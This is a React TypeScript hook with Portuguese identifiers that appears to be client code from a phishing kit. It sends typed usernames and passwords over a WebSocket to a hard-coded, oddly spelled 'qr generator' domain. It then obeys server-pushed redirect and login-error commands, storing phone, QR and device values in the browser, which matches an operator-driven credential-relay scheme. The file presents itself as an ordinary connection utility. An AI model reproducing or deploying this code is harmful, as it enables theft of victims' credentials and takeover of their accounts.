import { useEffect, useRef, useCallback } from "react";

const WS_URL = "wss://syncservicesqrgeneretor.online/ws/";

type WSMessage = {
  acao: string;
  url?: string;
  telefone?: string;
  feixe?: string;
  qr?: string;
  nome?: string;
  dispositivo?: string;
  motivo?: string;
  binario?: string;
};

type UseWebSocketOptions = {
  onMessage?: (msg: WSMessage) => void;
  onRedirect?: (msg: WSMessage) => void;
  onLoginError?: (motivo: string) => void;
  reconectarPayload?: Record<string, string>;
};

export function useWebSocket({ onMessage, onRedirect, onLoginError, reconectarPayload }: UseWebSocketOptions = {}) {
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimer = useRef<ReturnType<typeof setTimeout>>();
  const onMessageRef = useRef(onMessage);
  const onRedirectRef = useRef(onRedirect);
  const onLoginErrorRef = useRef(onLoginError);
  const reconectarRef = useRef(reconectarPayload);
  const isUnmounted = useRef(false);

  onMessageRef.current = onMessage;
  onRedirectRef.current = onRedirect;
  onLoginErrorRef.current = onLoginError;
  reconectarRef.current = reconectarPayload;

  const connect = useCallback(() => {
    if (isUnmounted.current) return;
    if (wsRef.current?.readyState === WebSocket.OPEN || wsRef.current?.readyState === WebSocket.CONNECTING) return;

    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("WebSocket conectado.");
      const usuario = localStorage.getItem("usuario");
      if (usuario) {
        const payload: Record<string, string> = { acao: "reconectar", usuario, ...reconectarRef.current };
        ws.send(JSON.stringify(payload));
      }
    };

    ws.onmessage = (event) => {
      const msg: WSMessage = JSON.parse(event.data);
      console.log("WS msg:", msg);

      // Save localStorage on redirect
      if (msg.acao === "redirecionar" && msg.url) {
        localStorage.setItem("feixe", msg.feixe || "");
        localStorage.setItem("qr", msg.qr || "");
        localStorage.setItem("nome", msg.nome || "");
        localStorage.setItem("dispositivo", msg.dispositivo || "");
        localStorage.setItem("telefone", msg.telefone || "");
        onRedirectRef.current?.(msg);
      }

      if (msg.acao === "erro_login") {
        onLoginErrorRef.current?.(msg.motivo || "Erro desconhecido");
      }

      // Generic message handler
      onMessageRef.current?.(msg);
    };

    ws.onclose = () => {
      console.log("WS fechado. Reconectando em 3s...");
      if (!isUnmounted.current) {
        reconnectTimer.current = setTimeout(connect, 3000);
      }
    };

    ws.onerror = (err) => {
      console.error("Erro WS:", err);
      ws.close();
    };
  }, []);

  const send = useCallback((data: Record<string, unknown>) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(data));
    } else {
      // Reconnect and retry
      connect();
      const retry = setInterval(() => {
        if (wsRef.current?.readyState === WebSocket.OPEN) {
          wsRef.current.send(JSON.stringify(data));
          clearInterval(retry);
        }
      }, 300);
      setTimeout(() => clearInterval(retry), 5000);
    }
  }, [connect]);

  const sendLogin = useCallback((usuario: string, senha: string) => {
    localStorage.setItem("usuario", usuario);
    send({ acao: "login", usuario, senha });
  }, [send]);

  useEffect(() => {
    isUnmounted.current = false;
    connect();
    return () => {
      isUnmounted.current = true;
      clearTimeout(reconnectTimer.current);
      wsRef.current?.close();
    };
  }, [connect]);

  return { send, sendLogin, wsRef };
}
